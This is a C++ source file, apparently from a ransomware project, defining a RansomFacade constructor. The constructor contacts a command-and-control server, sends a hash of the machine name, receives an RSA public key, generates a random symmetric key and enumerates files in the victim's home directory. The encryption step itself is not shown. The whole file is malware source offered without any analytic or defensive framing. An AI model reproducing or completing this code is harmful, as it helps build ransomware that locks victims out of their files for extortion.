#include "Ransom.h"
#include "fsutils.h"
#include "ConnectC2C.h"
#include "RansomFacade.h"

#include <string>
#include <vector>
#include <iostream>
#include <locale>
#include "md5.h"

#include <openssl/rsa.h>
#include <openssl/bio.h>
#include <openssl/pem.h>
#include <openssl/rand.h>

RansomFacade::RansomFacade(std::string const& ransom_url, uint16_t port)
{
	this->c2c = ConnectC2C(ransom_url, port);
	std::string home_dir      = get_home_directory();
	std::string computer_name = get_computer_name();

	std::string my_hash = Ransom::generate_hash(computer_name);
	std::string pub_key = this->c2c.sendRequest(my_hash);
	BIO* bo = BIO_new(BIO_s_mem());
	BIO_write(bo, pub_key.c_str(), strlen(pub_key.c_str()));
	EVP_PKEY* pkey = NULL;
	PEM_read_bio_PUBKEY(bo, &pkey, 0, 0);
	RSA* rsa = EVP_PKEY_get1_RSA(pkey);

	// generate random symmetric key
	
	unsigned char buff[32];
	int result = RAND_bytes(buff, 32);
	
	Ransom rans = Ransom(home_dir, rsa);

	for (const auto &r : rans.get_files()) {
		std::cout << r << std::endl;
	}

	// char* bbb = BN_bn2dec(RSA_get0_n(rsa));
	// std::cout << bbb << std::endl;
	// this->rans = Ransom(home_dir, );
}
